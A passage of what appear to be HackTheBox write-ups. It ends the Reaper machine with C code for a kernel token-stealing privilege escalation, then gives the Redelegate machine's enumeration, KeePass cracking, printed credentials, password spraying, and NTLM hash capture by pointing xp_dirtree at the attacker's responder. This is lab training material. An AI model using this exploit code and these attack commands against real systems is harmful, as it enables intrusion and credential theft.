true;\n                break;\n            }\n        }\n        if (!found) {\n            printf(\"Could not find current process in ActiveProcessLinks\\n\");\n            exit(-1);\n        }\n        eProcResult result{};\n        result.eProcess = cProcess;\n        result.tokenPtr = cTokenPtr;\n        result.pid = cPid;\n        return result;\n    }\n</code></pre> <p>However there are a number of things that need adjustment.  For example it should be able to take an arbitrary process ID.  The <code>EPROCESS</code> offsets specified in the function are in relation to <code>Windows 7 x64</code>, but this is <code>Windows 10 Pro x64</code>,  so is the real <code>REAPER</code> target machine, and the first document makes mention that the offsets are dependent on the version of windows as the structure keeps changing with each new version.</p> <p>And for the offsets, <code>EPROCESS</code> under <code>Windows 10 Pro x64</code>:</p> <p></p> <p></p> <p>Here is what I finally settled on:</p> <pre><code>#define EPROCESS_UniqueProcessId        0x440\n#define EPROCESS_ActiveProcessLinks     0x448\n#define EPROCESS_Token                  0x4b8\n\neProcResult GetCurrentEProcessByPid(DWORD pid) {\n    // find system EPROCESS &amp; token     \n    QWORD systemProc = getSystemEProcess();\n    printf(\"[&gt;] System _EPROCESS: 0x%llx\\n\", systemProc);\n\n    // walk ActiveProcessLinks to find our process\n    BOOL found = 0;\n    QWORD cProcess = systemProc;\n    DWORD cPid = 0;\n    QWORD cTokenPtr;\n\n    while (!found) {\n        cProcess = Action(OP_LOCAL, cProcess + EPROCESS_ActiveProcessLinks, 0x0); // get next entry in ActiveProcessLinks (dt _EPROCESS)        \n        cProcess -= EPROCESS_ActiveProcessLinks; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)\n        cPid = Action(OP_LOCAL, cProcess + EPROCESS_UniqueProcessId, 0x0);\n        cTokenPtr = Action(OP_LOCAL, cProcess + EPROCESS_Token, 0x0);\n        if (cPid == pid) {\n            printf(\"[&gt;] Process: %llx (PID: %d, TOKEN_PTR: %llx)\\n\", cProcess, cPid, cTokenPtr);\n            found = true;\n            break;\n        }\n    }\n    if (!found) {\n        printf(\"Could not find current process in ActiveProcessLinks\\n\");\n        exit(-1);\n    }\n    eProcResult result{};\n    result.eProcess = cProcess;\n    result.tokenPtr = cTokenPtr;\n    result.pid = cPid;\n    return result;\n}\n</code></pre> <p>The while loop loops over <code>ActiveProcessLinks</code> field, like a cursor.  The initial starting point is the system process.  The enclosed IF statement checks the <code>pid</code> passed in at invocation against the cursored <code>cPid</code>.</p> <p>The only caveat here is that it requires <code>getSystemEProcess()</code>, which itself requires a few structs and enums, other definitions, all of which I had to go hunting for throughout the repo. </p> <p>Definitions:  * SystemHandleInformation  * SystemHandleInformationSize Type definitions:  * eProcResult  * fNtQuerySystemInformation  * _SYSTEM_HANDLE_TABLE_ENTRY_INFO  * _SYSTEM_HANDLE_INFORMATION</p> <p>And then finally, a <code>main</code> function that does the walking and writing.</p> <pre><code>int main(void)\n{\n    reap = ReaperSysHandle();\n    printf(\"I am reapthereaper\\n\");\n    eProcResult systemProcess = GetCurrentEProcessByPid(4);\n    eProcResult currentProcess = GetCurrentEProcessByPid(GetCurrentProcessId());\n\n    Action(OP_REMOTE, systemProcess.eProcess + EPROCESS_Token, currentProcess.eProcess + EPROCESS_Token);\n    system(\"cmd.exe\");\n\n    if (reap) return CloseHandle(reap);\n}\n</code></pre> <p>Other notable mentions: 1. statically-compiled release x64: Project &gt; (binary) properties &gt; Configuration Properties &gt; C/C++ &gt; Code Generation &gt;  Runtime Library == \"Multithreaded (/MT)\" 2. Auto-copy to Virtualbox shared drive:  Project &gt; (binary) properties &gt; Configuration Properties &gt; Custom Build Step &gt; Command Line  == <code>copy C:\\Users\\Admin\\Desktop\\EXCLUSION_ZONE_WHITELISTED\\reapthereaper\\x64\\Release\\reapthereaper.exe z:\\</code></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#getting-the-shell_1","title":"Getting the shell","text":"<p>Upon exit:</p> <pre><code>C:\\users\\keysvc&gt;exit\nexit\n[handle] Good handle for device \\\\.\\Reaper: 0x0\nI am reapthereaper\n[&gt;] System _EPROCESS: 0xffff9101cae8d040\n[&gt;] Process: ffff9101cae8d040 (PID: 4, TOKEN_PTR: ffff800aa2a0f045)\n[&gt;] System _EPROCESS: 0xffff9101cae8d040\n[&gt;] Process: ffff9101d1220080 (PID: 2492, TOKEN_PTR: ffff800aac4f2735)\n</code></pre> <p></p> <p>Scythes out for Reaper</p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/","title":"Redelegate","text":""},{"location":"writeups/HackTheBox/Machines/Redelegate/#enumeration","title":"Enumeration","text":"<pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nmap -A -Pn 10.129.234.50\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 23:00 PDT\nNmap scan report for 10.129.234.50\nHost is up (0.15s latency).\nNot shown: 984 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 10-20-24  01:11AM                  434 CyberAudit.txt\n| 10-20-24  05:14AM                 2622 Shared.kdbx\n|_10-20-24  01:26AM                  580 TrainingAgenda.txt\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-30 06:00:44Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ssl-date: 2025-10-30T06:01:18+00:00; 0s from scanner time.\n| ms-sql-ntlm-info: \n|   10.129.234.50:1433: \n|     Target_Name: REDELEGATE\n|     NetBIOS_Domain_Name: REDELEGATE\n|     NetBIOS_Computer_Name: DC\n|     DNS_Domain_Name: redelegate.vl\n|     DNS_Computer_Name: dc.redelegate.vl\n|     DNS_Tree_Name: redelegate.vl\n|_    Product_Version: 10.0.20348\n| ms-sql-info: \n|   10.129.234.50:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-10-30T05:48:47\n|_Not valid after:  2055-10-30T05:48:47\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=dc.redelegate.vl\n| Not valid before: 2025-10-29T05:46:29\n|_Not valid after:  2026-04-30T05:46:29\n|_ssl-date: 2025-10-30T06:01:18+00:00; +1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: REDELEGATE\n|   NetBIOS_Domain_Name: REDELEGATE\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: redelegate.vl\n|   DNS_Computer_Name: dc.redelegate.vl\n|   DNS_Tree_Name: redelegate.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-10-30T06:01:09+00:00\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.95%E=4%D=10/29%OT=21%CT=1%CU=42673%PV=Y%DS=2%DC=T%G=Y%TM=6902FF\nOS:34%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS\nOS:=A)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=103%GCD=1%IS\nOS:R=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%S\nOS:S=S%TS=A)SEQ(SP=108%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M542NW\nOS:8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M5\nOS:42ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%\nOS:T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)\nOS:T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=\nOS:O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=\nOS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%\nOS:RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%I\nOS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-10-30T06:01:10\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT       ADDRESS\n1   197.02 ms 10.10.16.1\n2   99.48 ms  10.129.234.50\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 49.46 seconds\n</code></pre> <p>Some quick observations, but <code>FTP</code> allows <code>anonymous</code> access. The machine is a domain machine, its hostname is <code>dc.redelegate.vl</code>.  There's an <code>MSSQL</code> instance.  <code>RDP</code> is exposed.  <code>WinRM</code> is also exposed.</p> <p>As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using tooling for this purpose https://github.com/SYANiDE-/tooling</p> <pre><code>- entries in /etc/hosts\n    - echo \"10.129.234.50 dc.redelegate.vl redelegate.vl redelegate dc\" | sudo tee -a /etc/hosts\n- /etc/resolv.conf\n    - domain redelegate.vl\n    - nameserver 10.129.234.50\n- /etc/krb5.conf\n    - sudo make_krb5.conf.py -d dc.redelegate.vl -w\n- timesync to the domain controller\n    - sudo systemctl start vbox-disable-timesync.service\n    - sudo ntpdate -u dc.redelegate.vl\n</code></pre> <p>Let's check if the <code>guest</code> account is enabled:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nxc smb dc.redelegate.vl -u guest -p \"\"\nSMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)\nSMB         10.129.234.50   445    DC               [-] redelegate.vl\\guest: STATUS_ACCOUNT_DISABLED\n</code></pre> <p>It is disabled.  Let's check on the <code>FTP</code> service.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ ftp dc.redelegate.vl 21\nConnected to dc.redelegate.vl.\n220 Microsoft FTP Service\nName (dc.redelegate.vl:notroot): Anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||54329|)\n125 Data connection already open; Transfer starting.\n10-20-24  01:11AM                  434 CyberAudit.txt\n10-20-24  05:14AM                 2622 Shared.kdbx\n10-20-24  01:26AM                  580 TrainingAgenda.txt\n226 Transfer complete.\nftp&gt; binary\n200 Type set to I.\nftp&gt; mget *\nmget CyberAudit.txt [anpqy?]? a\nPrompting off for duration of mget.\n229 Entering Extended Passive Mode (|||54332|)\n125 Data connection already open; Transfer starting.\n100% |***************************************************************|   434        2.16 KiB/s    00:00 ETA\n226 Transfer complete.\n434 bytes received in 00:00 (1.43 KiB/s)\n229 Entering Extended Passive Mode (|||54333|)\n125 Data connection already open; Transfer starting.\n100% |***************************************************************|  2622       13.01 KiB/s    00:00 ETA\n226 Transfer complete.\n2622 bytes received in 00:00 (8.62 KiB/s)\n229 Entering Extended Passive Mode (|||54335|)\n125 Data connection already open; Transfer starting.\n100% |***************************************************************|   580        2.67 KiB/s    00:00 ETA\n226 Transfer complete.\n580 bytes received in 00:00 (1.82 KiB/s)\nftp&gt; exit\n221 Goodbye.\n</code></pre> <p>There were a few files, I went ahead and downloaded them.  </p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#downloaded-files","title":"Downloaded Files","text":"<p>The <code>CyberAudit.txt</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ cat CyberAudit.txt \nOCTOBER 2024 AUDIT FINDINGS\n\n[!] CyberSecurity Audit findings:\n\n1) Weak User Passwords\n2) Excessive Privilege assigned to users\n3) Unused Active Directory objects\n4) Dangerous Active Directory ACLs\n\n[*] Remediation steps:\n\n1) Prompt users to change their passwords: DONE\n2) Check privileges for all users and remove high privileges: DONE\n3) Remove unused objects in the domain: IN PROGRESS\n4) Recheck ACLs: IN PROGRESS\n</code></pre> <p>Very interesting.  </p> <p>The <code>TrainingAgenda.txt</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ cat TrainingAgenda.txt \nEMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)\n\nFriday 4th October  | 14.30 - 16.30 - 53 attendees\n\"Don't take the bait\" - How to better understand phishing emails and what to do when you see one\n\n\nFriday 11th October | 15.30 - 17.30 - 61 attendees\n\"Social Media and their dangers\" - What happens to what you post online?\n\n\nFriday 18th October | 11.30 - 13.30 - 7 attendees\n\"Weak Passwords\" - Why \"SeasonYear!\" is not a good password \n\n\nFriday 25th October | 9.30 - 12.30 - 29 attendees\n\"What now?\" - Consequences of a cyber attack and how to mitigate them\n</code></pre> <p>Interesting... <code>SeasonYear!</code>.  Maybe that is a literal, maybe that is a clue for constructing a list of passwords for brute forcing or spraying.  Let's quickly generate a password list.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ echo 'SeasonYear!' | tee -a pwlist.txt\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ for year in 20{00..25}; do for season in Summer Winter Spring Fall; do echo \"$season$year\"'!' | tee -a pwlist.txt; done; done\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#keepass-vault","title":"Keepass vault","text":"<p>The <code>Shared.kdbx</code> is a <code>keepass</code> vault:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ file Shared.kdbx \nShared.kdbx: Keepass password database 2.x KDBX\n</code></pre> <p>Try to crack the master password.  For that, I'll need to extract a hash.  I can use <code>keepass2john</code> for that</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ keepass2john Shared.kdbx | tee -a Shared.kdbx.hash\nShared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca\n</code></pre> <p>I had initially started to try bruteforcing this using <code>rockyou.txt</code>, but a couple observations, the algorithm is <code>AES</code> and the iteration count is <code>600,000</code>.  So <code>rockyou.txt</code> is going to take a really, really long time.</p> <p>I aborted after about 10 mins.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ sudo john Shared.kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt --force \n[sudo] password for notroot: \nUsing default input encoding: UTF-8\nLoaded 1 password hash (KeePass [SHA256 AES 32/64])\nCost 1 (iteration count) is 600000 for all loaded hashes\nCost 2 (version) is 2 for all loaded hashes\nCost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:10:20 0.09% (ETA: 2025-11-06 19:11) 0g/s 25.38p/s 25.38c/s 25.38C/s 1qwert..091088\nSession aborted\n</code></pre> <p>Going back on the generated password list, that actually ended up paying off.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ sudo john Shared.kdbx.hash --wordlist=pwlist.txt --force \nUsing default input encoding: UTF-8\nLoaded 1 password hash (KeePass [SHA256 AES 32/64])\nCost 1 (iteration count) is 600000 for all loaded hashes\nCost 2 (version) is 2 for all loaded hashes\nCost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nFall2024!        (Shared)     \n1g 0:00:00:04 DONE (2025-10-29 23:38) 0.2288g/s 24.02p/s 24.02c/s 24.02C/s Summer2024!..SeasonYear!\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>The master password is <code>Fall2024!</code>.  </p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ keepass2 Shared.kdbx\n</code></pre> <p>Lets open up the <code>Shared.kdbx</code> using <code>keepass</code></p> <p></p> <p>There are a number of folders (IT, Helpdesk, Finance), and each one has a number of stored credentials.</p> <p></p> <p>Here is what I collected:</p> <pre><code>### IT\nFTP:FTPUser:SguPZBKdRyxWzvXRWy6U:deprecated\nFS01 Admin:Administrator:Spdv41gg4BlBgSYIW1gF:\nWEB01:WordPress Panel:cn4KOEgsHqvKXPjEnSD9:\nSQL Guest Access:SQLGuest:zDPBpaF4FywlqIv11vii\n### HelpDesk\nKeyFob Combination::22331144:\n### Finance\nTimesheet Manager:Timesheet:hMFS4I0Kj8Rcd62vqi5X:\nPayrol App:Payroll:cVkqz4bCM7kJRSNlgx2G:\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#finding-a-use-for-discovered-credentials","title":"Finding a use for discovered credentials","text":"<p>It looks like the following pairs might be valid:</p> <pre><code>ftp:SguPZBKdRyxWzvXRWy6U\nftpuser:SguPZBKdRyxWzvXRWy6U\nfs01:Spdv41gg4BlBgSYIW1gF\nAdministrator:Spdv41gg4BlBgSYIW1gF\nweb01:cn4KOEgsHqvKXPjEnSD9\nsqlguest:zDPBpaF4FywlqIv11vii\ntimesheet:hMFS4I0Kj8Rcd62vqi5X\npayroll:cVkqz4bCM7kJRSNlgx2G\n</code></pre> <p>Need to write them out to individual files</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ echo \"\"\"ftp:SguPZBKdRyxWzvXRWy6U\nftpuser:SguPZBKdRyxWzvXRWy6U\nfs01:Spdv41gg4BlBgSYIW1gF\nAdministrator:Spdv41gg4BlBgSYIW1gF\nweb01:cn4KOEgsHqvKXPjEnSD9\nsqlguest:zDPBpaF4FywlqIv11vii\ntimesheet:hMFS4I0Kj8Rcd62vqi5X\npayroll:cVkqz4bCM7kJRSNlgx2G\"\"\" &gt; creds.cdv\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ for line in $(cat creds.cdv); do cut -d ':' -f 1 &lt;&lt;&lt;$line | tee -a users.txt; cut -d ':' -f 2 &lt;&lt;&lt;$line | tee -a passes.txt; done\n</code></pre> <p>Try spraying.  There are several services crackmapexec can run password spraying against:</p> <pre><code>$ nxc --help\n\n[...]\n\nAvailable Protocols:\n  {winrm,ssh,mssql,rdp,vnc,smb,ldap,nfs,wmi,ftp}\n    winrm               own stuff using WINRM     #open\n    ssh                 own stuff using SSH\n    mssql               own stuff using MSSQL     #open\n    rdp                 own stuff using RDP       #open\n    vnc                 own stuff using VNC\n    smb                 own stuff using SMB       #open\n    ldap                own stuff using LDAP      #open\n    nfs                 own stuff using NFS\n    wmi                 own stuff using WMI\n    ftp                 own stuff using FTP       #open\n</code></pre> <p>Nothing on <code>SMB</code> and <code>LDAP</code>. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nxc smb dc.redelegate.vl -u users.txt -p passes.txt --no-bruteforce --continue-on-success\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nxc ldap dc.redelegate.vl -u users.txt -p passes.txt --no-bruteforce --continue-on-success\n</code></pre><p></p> <p>On <code>MSSQL</code>, I got a hit:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nxc mssql dc.redelegate.vl -u users.txt -p passes.txt --no-bruteforce --continue-on-success --local-authMSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)\nMSSQL       10.129.234.50   1433   DC               [-] DC\\ftp:SguPZBKdRyxWzvXRWy6U (Login failed for user 'ftp'. Please try again with or without '--local-auth')\nMSSQL       10.129.234.50   1433   DC               [-] DC\\ftpuser:SguPZBKdRyxWzvXRWy6U (Login failed for user 'ftpuser'. Please try again with or without '--local-auth')\nMSSQL       10.129.234.50   1433   DC               [-] DC\\fs01:Spdv41gg4BlBgSYIW1gF (Login failed for user 'fs01'. Please try again with or without '--local-auth')\nMSSQL       10.129.234.50   1433   DC               [-] DC\\Administrator:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Administrator'. Please try again with or without '--local-auth')\nMSSQL       10.129.234.50   1433   DC               [-] DC\\web01:cn4KOEgsHqvKXPjEnSD9 (Login failed for user 'web01'. Please try again with or without '--local-auth')\nMSSQL       10.129.234.50   1433   DC               [+] DC\\sqlguest:zDPBpaF4FywlqIv11vii \nMSSQL       10.129.234.50   1433   DC               [-] DC\\timesheet:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'timesheet'. Please try again with or without '--local-auth')\nMSSQL       10.129.234.50   1433   DC               [-] DC\\payroll:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'payroll'. Please try again with or without '--local-auth')\n</code></pre> <p>The account <code>sqlguest</code> can authenticate as an <code>MSSQL</code> user.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-mssqlclient sqlguest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (SQLGuest  guest@master)&gt; \n</code></pre> <p>There is a whole lot of nothing going on and/or going for this <code>MSSQL</code> instance.   The only thing of interest seems to be the ability to <code>xp_dirtree</code> a <code>UNC path</code> that points back to my attacking machine, and capture the<code>NetNTLMv2-SSP</code> authentication using <code>responder</code>:</p> <pre><code>SQL (SQLGuest  guest@msdb)&gt; xp_dirtree \\\\10.10.16.59\\shared\\file\n</code></pre> <p>And <code>responder</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ sudo responder -I tun0 -A\n[sudo] password for notroot: \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n\n[+] Poisoners:\n    LLMNR                      [OFF]\n    NBT-NS                     [OFF]\n    MDNS                       [OFF]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [ON]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Force ESS downgrade        [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.16.59]\n    Responder IPv6             [dead:beef:4::1039]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']\n    Don't Respond To MDNS TLD  ['_DOSVC']\n    TTL for poisoned response  [default]\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-399GZJDC3HJ]\n    Responder Domain Name      [RMGF.LOCAL]\n    Responder DCE-RPC Port     [46231]\n\n[*] Version: Responder 3.1.7.0\n[*] Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;\n[*] To sponsor Responder: https://paypal.me/PythonResponder\n\n[+] Listening for events...\n\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.16.59) is not on the same subnet than the DNS server (10.129.234.50).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.16.59) is not on the same subnet than the DNS server (192.168.50.1).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n[SMB] NTLMv2-SSP Client   : 10.129.234.50\n[SMB] NTLMv2-SSP Username : REDELEGATE\\sql_svc\n[SMB] NTLMv2-SSP Hash     : sql_svc::REDELEGATE:a1829572d87cbd58:6F8B4EAD90D9387997BED7E973A185DD:010100000000000080C2BEA13549DC0106465B8E58B661F0000000000200080052004D004700460001001E00570049004E002D0033003900390047005A004A0044004300330048004A0004003400570049004E002D0033003900390047005A004A0044004300330048004A002E0052004D00470046002E004C004F00430041004C000300140052004D00470046002E004C004F00430041004C000500140052004D00470046002E004C004F00430041004C000700080080C2BEA13549DC01060004000200000008003000300000000000000000000000003000007DF20DB760243F05E63DC4EC90677E563E7AAC85DA95330A0050F9BC64BA366D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350039000000000000000000\n</code></pre> <p>Try to crack it</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ hashcat --identify sql_svc.hash\nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n   5600 | NetNTLMv2                                                  | Network Protocol\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ hashcat -m 5600 sql_svc.hash pwlist.txt --force --quiet\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ hashcat -m 5600 sql_svc.hash passes.txt --force --quiet\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt --force --quiet\n</code></pre> <p>The hash does not seem to crack...</p> <p>Other interesting finds in the <code>MSSQL</code> instance.  I found an SQL Server encoded sid for <code>sql_svc</code>:</p> <pre><code>SQL (SQLGuest  guest@master)&gt; select SUSER_SID('redelegate\\sql_svc')\n\n-----------------------------------------------------------   \nb'010500000000000515000000a185deefb22433798d8e847a5f040000'\n</code></pre> <p>I have a script, I did not write it and I forget where I got it (I think I may have hallucinated it at least in part with <code>Gemini</code>, and then finished what it started).  But this script can convert 